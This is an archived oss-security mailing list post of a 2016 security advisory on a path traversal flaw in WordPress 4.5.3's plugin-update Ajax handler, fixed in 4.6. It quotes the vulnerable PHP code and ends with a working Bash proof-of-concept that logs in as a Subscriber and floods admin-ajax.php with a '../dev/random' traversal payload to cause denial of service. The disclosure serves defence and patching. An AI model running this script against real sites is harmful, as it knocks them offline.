X-VM-v5-Data: ([nil t nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
	["5253" "Saturday" "20" "August" "2016" "11:05:47" "+0200" "Summer of Pwnage" "lists@securify.nl" "<b9077094-e1d3-cfd5-5c97-1ddf970d8a9a@securify.nl>" "135" "[oss-security] Path traversal vulnerability in WordPress Core Ajax handlers" "^Date:" nil nil "8" "2016082009:05:47" "[oss-security] Path traversal vulnerability in WordPress Core Ajax handlers" (number mark "U       lists@securi Aug 20  135/5253  " thread-indent "\"[oss-security] Path traversal vulnerability in WordPress Core Ajax handlers\"\n") nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
	nil)
X-Mozilla-Status: 0000
X-Mozilla-Status2: 00000000
Received: (qmail 21699 invoked by uid 550); 20 Aug 2016 09:06:02 -0000
Mailing-List: contact oss-security-help@lists.openwall.com; run by ezmlm
Precedence: bulk
List-Post: <mailto:oss-security@lists.openwall.com>
List-Help: <mailto:oss-security-help@lists.openwall.com>
List-Unsubscribe: <mailto:oss-security-unsubscribe@lists.openwall.com>
List-Subscribe: <mailto:oss-security-subscribe@lists.openwall.com>
List-ID: <oss-security.lists.openwall.com>
Received: (qmail 21651 invoked from network); 20 Aug 2016 09:06:01 -0000
X-Virus-Scanned: amavisd-new at pine.nl
Organization: Securify B.V.
Message-ID: <b9077094-e1d3-cfd5-5c97-1ddf970d8a9a@securify.nl>
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:45.0) Gecko/20100101
 Thunderbird/45.2.0
MIME-Version: 1.0
Content-Type: text/plain; charset=utf-8; format=flowed
Content-Transfer-Encoding: 7bit
Date: Sat, 20 Aug 2016 11:05:47 +0200
From: Summer of Pwnage <lists@securify.nl>
Reply-To: oss-security@lists.openwall.com
Subject: [oss-security] Path traversal vulnerability in WordPress Core Ajax handlers
To: oss-security@lists.openwall.com

------------------------------------------------------------------------
Path traversal vulnerability in WordPress Core Ajax handlers
------------------------------------------------------------------------
Yorick Koster, July 2016

------------------------------------------------------------------------
Abstract
------------------------------------------------------------------------
A path traversal vulnerability was found in the Core Ajax handlers of
the WordPress Admin API. This issue can (potentially) be used by an
authenticated user (Subscriber) to create a denial of service condition
of an affected WordPress site.

------------------------------------------------------------------------
OVE ID
------------------------------------------------------------------------
OVE-20160712-0036

------------------------------------------------------------------------
See also
------------------------------------------------------------------------
#37490 [2] - Improve capability checks in wp_ajax_update_plugin() and
wp_ajax_delete_plugin()

------------------------------------------------------------------------
Tested versions
------------------------------------------------------------------------
This issue was successfully tested on the WordPress version 4.5.3.

------------------------------------------------------------------------
Fix
------------------------------------------------------------------------
WordPress version 4.6 [3] mitigates this vulnerability by moving the
CSRF check to the top of the affected method(s).

------------------------------------------------------------------------
Introduction
------------------------------------------------------------------------
WordPress is web software that can be used to create a website, blog,
or app. A path traversal vulnerability exists in the Core Ajax handlers
of the WordPress Admin API. This issue can (potentially) be used by an
authenticated user (Subscriber) to create a denial of service condition
of an affected WordPress site.

------------------------------------------------------------------------
Details
------------------------------------------------------------------------
The path traversal vulnerability exists in the file ajax-actions.php, in
particular in the function wp_ajax_update_plugin(). The vulnerable code
is shown below.

function wp_ajax_update_plugin() {
	global $wp_filesystem;

	$plugin = urldecode( $_POST['plugin'] );

	$status = array(
		'update'     => 'plugin',
		'plugin'     => $plugin,
		'slug'       => sanitize_key( $_POST['slug'] ),
		'oldVersion' => '',
		'newVersion' => '',
	);

	$plugin_data = get_plugin_data( WP_PLUGIN_DIR . '/' . $plugin );
	if ( $plugin_data['Version'] ) {
		$status['oldVersion'] = sprintf( __( 'Version %s' ), 
$plugin_data['Version'] );
	}

	if ( ! current_user_can( 'update_plugins' ) ) {
		$status['error'] = __( 'You do not have sufficient permissions to 
update plugins for this site.' );
  		wp_send_json_error( $status );
	}

	check_ajax_referer( 'updates' );

As can be seen in the code above, the function first tries to retrieve
some version information from the target plugin. After this is done, it
checks the user's privileges and it will verify the nonce (to prevent
Cross-Site Request Forgery). The code that retrieves the version
information from the plugin is vulnerable to path traversal. Since the
security checks are done at a later stage, the affected code is
reachable by any logged on user, including Subscribers.

Potentially this issue can be used to disclose information, provided
that the target file contains a line with Version:. What is more
important that it also allows for a denial of service condition as the
logged in attacker can use this flaw to read up to 8 KB of data from
/dev/random. Doing this repeatedly will deplete the entropy pool, which
causes /dev/random to block; blocking the PHP scripts. Using a very
simple script, it is possible for an authenticated user (Subscriber) to
bring down a WordPress site. It is also possible to trigger this issue
via Cross-Site Request Forgery as the nonce check is done too late in
this case.

------------------------------------------------------------------------
Proof of concept
------------------------------------------------------------------------
The following Bash script can be used to trigger the denial of service
condition.

#!/bin/bash
target="http://<target>"
username="subscriber"
password="password"
cookiejar=$(mktemp)
	
# login
curl --cookie-jar "$cookiejar" \
	--data
"log=$username&pwd=$password&wp-submit=Log+In&redirect_to=%2f&testcookie=1" 
\
	"$target/wp-login.php" \
	>/dev/null 2>&1
	
# exhaust apache
for i in `seq 1 1000`
	do
		curl --cookie "$cookiejar" \
		--data 
"plugin=../../../../../../../../../../dev/random&action=update-plugin" \
		"$target/wp-admin/admin-ajax.php" \
		>/dev/null 2>&1 &
done
	
rm "$cookiejar"
------------------------------------------------------------------------
References
------------------------------------------------------------------------
[1] 
https://sumofpwn.nl/advisory/2016/path_traversal_vulnerability_in_wordpress_core_ajax_handlers.html
[2] https://core.trac.wordpress.org/ticket/37490
[3] https://wordpress.org/wordpress-4.6.zip
